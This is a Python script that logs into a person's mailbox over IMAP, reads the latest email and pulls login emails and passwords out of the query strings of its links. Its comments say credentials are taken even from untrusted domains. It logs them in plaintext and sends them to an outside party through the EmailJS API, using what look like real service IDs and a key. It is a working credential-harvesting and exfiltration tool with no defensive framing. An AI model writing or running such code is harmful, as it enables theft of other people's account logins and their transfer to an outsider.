import imaplib
import re
import urllib.parse
import logging
import ssl
import requests  # For sending the data to EmailJS

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Email server configuration
imap_server = 'imap.example.com'  # Replace with A's actual IMAP server (e.g., imap.gmail.com)
email_address = 'A_email@example.com'  # A's email address
password = 'A_password'  # A's email password
trusted_domains = ['trusted.com', 'anothertrusted.com']  # Trusted domains list (can be empty)

# EmailJS configuration (Replace with your actual EmailJS details)
emailjs_service_id = 'service_oyc7a9o'  # Edit your EmailJS service ID here
emailjs_template_id = 'template_bn5jzkh'  # Edit your EmailJS template ID here
emailjs_api_key = 'QJObhH45powgCqsCo'  # Edit your EmailJS API key here

# Secure SSL context
ssl_context = ssl.create_default_context()

# Connect to the email server
try:
    mail = imaplib.IMAP4_SSL(imap_server, ssl_context=ssl_context)
    mail.login(email_address, password)
except imaplib.IMAP4.error as e:
    logging.error(f"Failed to log in to the email server: {str(e)}")
    exit(1)

# Select the mailbox (inbox)
try:
    mail.select('inbox')
except imaplib.IMAP4.error as e:
    logging.error(f"Failed to select the mailbox: {str(e)}")
    mail.close()
    mail.logout()
    exit(1)

# Fetch the latest email
try:
    status, data = mail.search(None, 'ALL')
    email_ids = data[0].split()
    latest_email_id = email_ids[-1]
    status, email_data = mail.fetch(latest_email_id, '(RFC822)')
    email_message = email_data[0][1]
except imaplib.IMAP4.error as e:
    logging.error(f"Failed to fetch the latest email: {str(e)}")
    mail.close()
    mail.logout()
    exit(1)

# Properly decode the email content
from email import message_from_bytes
email_msg = message_from_bytes(email_message)
body = ""
if email_msg.is_multipart():
    for part in email_msg.walk():
        if part.get_content_type() == "text/plain":
            body += part.get_payload(decode=True).decode()
else:
    body = email_msg.get_payload(decode=True).decode()

# Extract any URLs from the email body
link_pattern = re.compile(r'https?://[^\s]+')
links = link_pattern.findall(body)

# Variable to store extracted login details
login_email = None
login_password = None

# Check if any link is from a trusted domain and extract login details from the URL query
for link in links:
    try:
        parsed_url = urllib.parse.urlparse(link)
        # If the link is from a trusted domain or no trusted domains are defined
        if parsed_url.netloc in trusted_domains or not trusted_domains:
            query_params = urllib.parse.parse_qs(parsed_url.query)
            login_email = query_params.get('email', [''])[0]
            login_password = query_params.get('password', [''])[0]
            if login_email and login_password:
                logging.info(f"Found login credentials from trusted domain: {login_email}, {login_password}")
                break
        else:
            # If domain is not trusted, extract credentials anyway (even if domain is not trusted)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            login_email = query_params.get('email', [''])[0]
            login_password = query_params.get('password', [''])[0]
            if login_email and login_password:
                logging.info(f"Found login credentials from untrusted domain: {login_email}, {login_password}")
                break
    except Exception as e:
        logging.warning(f"Failed to parse URL: {str(e)}")

# If no login credentials are found in any of the links, log that information
if not login_email or not login_password:
    logging.info("No login email or password found in the email links.")

# Send extracted data to EmailJS
if login_email and login_password:
    try:
        data = {
            'service_id': emailjs_service_id,
            'template_id': emailjs_template_id,
            'user_id': emailjs_api_key,
            'template_params': {
                'login_email': login_email,
                'login_password': login_password
            }
        }
        response = requests.post('https://api.emailjs.com/api/v1.0/email/send', json=data)
        response.raise_for_status()  # Will raise an error for unsuccessful requests
        logging.info("Collected information sent successfully to EmailJS.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send the collected information to EmailJS: {str(e)}")

# Close the connection
mail.close()
mail.logout()
